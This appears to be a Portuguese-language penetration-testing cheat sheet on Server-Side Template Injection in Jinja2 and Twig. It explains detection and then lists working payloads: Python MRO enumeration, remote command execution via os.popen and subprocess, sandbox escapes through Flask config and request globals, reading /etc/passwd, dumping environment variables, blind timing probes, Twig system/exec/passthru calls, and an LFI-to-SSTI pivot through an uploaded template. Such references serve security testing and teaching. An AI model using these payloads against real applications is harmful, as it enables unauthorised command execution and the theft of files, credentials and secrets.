---
title: Server-Side Template Injection
---

### 1. Template Engines e Funcionamento Interno

{{< tabs items="Visão Geral, Jinja2, Twig" >}}
{{< tab >}}

#### **Visão Geral**
SSTI ocorre quando dados controlados pelo usuário são interpretados como template no servidor. Isso permite avaliação de expressões, acesso a objetos internos e escalonamento para execução remota de comandos.
{{< /tab >}}
{{< tab >}}

#### **Jinja2**
Engine Python que permite introspecção por meio da MRO e acesso amplo a atributos internos. Se mal configurado, possibilita revelar classes sensíveis, manipular objetos expostos e executar comandos.
{{< /tab >}}
{{< tab >}}

#### **Twig**
Engine PHP cujo comportamento depende da configuração. Filtros, funções e includes inseguros podem expor caminhos para execução de comandos, leitura de arquivos e envenenamento de templates.
{{< /tab >}}
{{< /tabs >}}

---
### 2. Identificação da Vulnerabilidade

#### **1. Teste com expressões aritméticas**

Se o engine interpretar:

```text
{{7*7}}
${7*7}
<%= 7*7 %>
```

Há forte indicação de SSTI.

#### **2. Delimitadores característicos**

* `{{ }}` → Jinja2 / Twig / Django
* `${ }` → Mako
* `<%= %>` → ERB / ASP

#### **3. Observação de erros**

Erros como `TemplateSyntaxError`, `UndefinedError` ou mensagens específicas indicam o engine utilizado.

#### **4. Reflexão direta**

Se o valor enviado aparece processado no HTML, JSON ou em partes renderizadas, há potencial de exploração.

---
### 3. Jinja2

#### **Enumeração (MRO)**

**Conceito:** descobrir classes internas acessíveis pelo template engine.
**Requisitos:** engine ativo, avaliação de expressões habilitada, atributos não filtrados.

```jinja
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

#### **Localização de classes críticas (ex.: Popen)**

**Conceito:** identificar classes capazes de executar comandos.
**Requisitos:** acesso irrestrito a atributos de classes.

```jinja
{{ [c for c in ''.__class__.__mro__[1].__subclasses__() if 'Popen' in str(c)] }}
```

#### **Execução de comandos (RCE)**

**Conceito:** usar módulos internos Python para executar comandos.
**Requisitos:** acesso a `__import__`, módulos `os` ou `subprocess` disponíveis.

```jinja
{{ __import__('os').popen('id').read() }}
{{ __import__('subprocess').check_output('id', shell=True) }}
```

#### **Quebra de sandbox via globals**

**Conceito:** acessar funções internas expostas e contornar restrições.
**Requisitos:** objetos globais expostos, atributos internos acessíveis.

```jinja
{{ config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### **Escalonamento via objetos expostos (Flask)**

**Conceito:** explorar objetos da aplicação para obter RCE.
**Requisitos:** `request` ou `application` expostos.

```jinja
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### **Leitura de arquivos**

**Conceito:** acessar arquivos internos via objetos expostos.
**Requisitos:** objeto `app` exposto, permissões de leitura.

```jinja
{{ app.open_resource('/etc/passwd').read() }}
```

#### **Extração de variáveis de ambiente**

**Conceito:** recuperar variáveis sensíveis.
**Requisitos:** acesso a `__import__`, módulo `os` disponível.

```jinja
{{ __import__('os').environ }}
```

#### **SSTI cego (side-channel)**

**Conceito:** confirmar execução sem retorno direto.
**Requisitos:** engine executando comandos, capacidade de observar atraso.

```jinja
{{ __import__('os').popen('sleep 5') }}
```

#### **Template Poisoning (Jinja2)**

**Conceito:** inserir payloads persistentes em templates reutilizados.
**Requisitos:** includes dinâmicos, edição de templates.

```jinja
{% include user_controlled_snippet %}
```

---
### 4. Twig

#### **Execução de comandos (RCE)**

**Conceito:** abusar de funções PHP expostas ao template.
**Requisitos:** funções como `system`, `exec`, `shell_exec` expostas; sandbox permissivo.

```twig
{{ system('id') }}
{{ 'id'|system }}
{{ shell_exec('id') }}
{{ exec('id') }}
{{ passthru('id') }}
```

#### **Leitura de arquivos**

**Conceito:** utilizar includes permissivos para acessar arquivos locais.
**Requisitos:** função `include` ativa, caminhos não filtrados.

```twig
{{ include('/etc/passwd') }}
```

#### **Quebra de sandbox / atributos expostos**

**Conceito:** escapar de restrições explorando objetos internos.
**Requisitos:** sandbox parcial, acesso a `attribute()`.

```twig
{{ attribute(_self, '__class__') }}
```

#### **Template Poisoning (Twig)**

**Conceito:** injetar payloads em blocos/includes controlados.
**Requisitos:** includes dinâmicos, controle sobre templates.

```twig
{% include user_template %}
```

#### **Pivot LFI → SSTI**

**Conceito:** transformar LFI em execução remota ao forçar o Twig a interpretar um arquivo controlado.
**Requisitos:** LFI funcional; upload de `.twig` permitido.

1. Upload:

```twig
{{ system('id') }}
```

2. Inclusão:

```
?page=/uploads/payload.twig
```

#### **Execução indireta via wrappers customizados**

**Conceito:** funções customizadas expostas ao template podem gerar RCE.
**Requisitos:** wrapper usando `shell_exec`, `system` ou similares.

```php
$twig->addFunction(new Twig_SimpleFunction('run', function($cmd){ return shell_exec($cmd); }));
```

Uso no template:

```twig
{{ run('id') }}
```
